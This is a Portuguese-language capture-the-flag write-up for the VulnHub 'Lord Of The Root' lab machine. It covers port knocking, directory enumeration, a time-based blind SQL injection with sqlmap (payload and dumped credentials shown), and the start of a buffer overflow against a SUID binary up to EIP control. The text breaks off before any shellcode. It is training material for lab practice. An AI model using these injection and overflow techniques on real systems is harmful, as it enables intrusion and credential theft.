---
title: "VulnHub - Lord Of The Root 1.0.1"
tags: [Linux,Medium]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/inicial.png)

Link: [Lord Of The Root 1.0.1](https://www.vulnhub.com/entry/lord-of-the-root-101,129/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/nmap1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/nmap2.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

> -sU --> Scan em portas UDP

### Verificamos que temos 1 porta aberta no servidor

> Porta 22 -> SSH

## Enumeração da Porta 22

Já que temos somente ela, vamos tentar entrar pra ver se temos algo ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ssh.png)

Bom, ao que deu pra entender é um Port Knocking

### Port Knocking

Qual a ideia de port knocking? Ele é utilizado para que portas que não devem estar sempre abertas fiquem fechadas e só sejam abertas quando houver o "toque", "knock" em portas específicas. De bruto modo é isso, ta, show de bola… e quais são essas portas?

Uma wiki bacana, que explica do que se trata pode ser encontrada em:

[Knock](https://wiki.archlinux.org/index.php/Port_knocking)

Então fazemos o Port Knocking nas portas 1, 2 e 3

```bash
for x in 1 2 3; do nmap -Pn --max-retries 0 -p $x 192.168.56.139; done
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/knock.png)

Rodamos o nmap novamente a agora apareceu a porta 1337 aberta!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/knock1.png)

## Enumeração da Porta 1337

Com o nmap enumeramos o que tem rodando nessa porta

```bash
nmap -sV -sC -Pn -p1337 192.168.56.139
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/knock2.png)

Bom, é um servidor web, então acessamos pra ver o que tem nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/knock3.png)

Uma imagem... Baixamos ela pra nossa máquina pra ver se tem algo escondido nela

Verificamos que não tem nada escondido nessa imagem

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/exiftool.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/binwalk.png)

Rodamos o Gobuster nele pra ver se encontramos mais algum diretório

```bash
gobuster dir -u http://192.168.56.139:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/gobuster1.png)

Acessamos o **/robots.txt**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/robots.png)

No código fonte vemos algo interessante

`<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/robots1.png)

Testamos a imagem com o `exiftool` e o `binwalk` pra ver se tem algo nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/exiftool1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/binwalk1.png)

Nada de interessante na imagem também

Aquele código que encontramos no código fonte parece ser um base64, então decodamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/base.png)

`/978345210/index.php` encontramos esse diretório

Acessamos e é um campo de login e senha!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login.png)

Mandamos pro BurpSuite a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login2.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login3.png)

Depois de um bom tempo bricando com essa requisição, não fui capaz de encontrar um ponto de exploração, o que eu geralmente faço em background sempre que vejo alguma requisição assim é jogar o sqlmap nele pra ver se me traz algum resultado

Salvamos em uma requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login4.png)

# Blind SQLInjection

Rodamos o sqlmap nele agora

```bash
sqlmap -r req.txt --dump
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login5.png)

Esperamos... ele encontrou um Blind SQLInjection no parâmetro Login

```
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1751 FROM (SELECT(SLEEP(5)))yIpO) AND 'XOOh'='XOOh&password=admin&submit= Login
---
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login6.png)

Agora esperamos o SQLMap fazer o time-based e me retornar os valores que preciso para dar prosseguimento na exploração da máquina

Vamos adaptando o SQLMap pra nos trazer o resultado que queremos

```bash
sqlmap -u http://192.168.56.139:1337/978345210/index.php --method POST --data "username=user&password=pass&submit=+Login+" --not-string="Username or Password is invalid" -D Webapp -T Users --dump
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login7.png)

Nos traz algumas credenciais e senhas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login8.png)

```
 +----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
```

Acessamos o webpage com essas credenciais e não encontramos nada de útil para a exploração.

# smeagol -> root

Acessamos via SSH a máquina com as credenciais do `smeagol`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ssh.png)

Agora iniciamos a enumeração para escalarmos privilégio nessa máquina

Rodamos o linpeas para encontrar pontos de escalação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin.png)

Baixamos na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin1.png)

Rodamos na máquina virtual

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin2.png)

O que encontramos?

`Kernel` desatualizado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin3.png)

Arquivos com `SUID` habilitado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin4.png)

Vamos mostrar a escalação desses dois modos

## Buffer Overflow

Bom, pela cara dos arquivos devemos fazer um Buffer Overflow neles pra podermos virar root nessa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf.png)

Verificamos o que ele faz

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf1.png)

Pelas strings dele verificamos que ele tem a função `strcpy`, e essa função é vulnerável a Buffer Overflow

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf2.png)

Criamos um pattern nele pra ver em quanto ele da o crash

```bash
./file $(python -c 'print "A" * 200')
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf3.png)

Criamos um agora personalizado

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf4.png)

O binário fica mudando de porta a cada pouco, isso tem que ser verificado... quando joguei o pattern no errado ele não aparece com Segmentation Fault, antes tava na porta 1 agora ta na porta 2

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf5.png)

Encontramos o ponto de crash dele

```
0x41376641 in ?? ()
```

Agora descobrimos o ponto exato, que é 171

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf6.png)

Agora comprovamos esse crash com o pattern de 171

```bash
./file $(python -c 'print "A" * 171 + BBBB')
```

Agora está na porta 2, mas ai está, o **0x42424242** que é **BBBB**

Ou seja... Controlamos o EIP!!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf7.png)

